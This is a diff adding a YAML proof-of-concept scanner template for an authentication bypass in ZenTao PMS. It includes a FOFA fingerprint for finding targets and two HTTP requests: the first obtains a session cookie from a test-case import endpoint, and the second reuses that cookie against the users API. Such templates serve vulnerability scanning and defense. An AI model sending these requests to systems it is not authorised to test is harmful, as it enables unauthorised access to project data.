@@ -1,0 +1,24 @@
+id: poc-yaml-zentao-pms-authentication-bypass
+info:
+  name: ZenTao PMS 项目管理系统身份认证绕过漏洞
+  severity: high
+  tags:
+  - 权限绕过
+  finger: zentao
+  fofa: icon_hash="53755730"
+variables:
+  t1: random_str(8)
+  t2: random_str(8)
+requests:
+- method: GET
+  path: /zentao/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID={{.t1}}&branch={{.t2}}
+  expression: status_code == 200
+  output:
+  - regex_match(headers,"zentaosid=(?P<cookie>.*?);")
+- method: GET
+  path: /api.php/v1/users
+  headers:
+    Cookie: zentaosid={{.cookie}}
+  expression: status_code == 400 && contains(body,"error") && contains(body,"no company-browse
+    priv") && contains(content_type,"application/json")
+transport: http
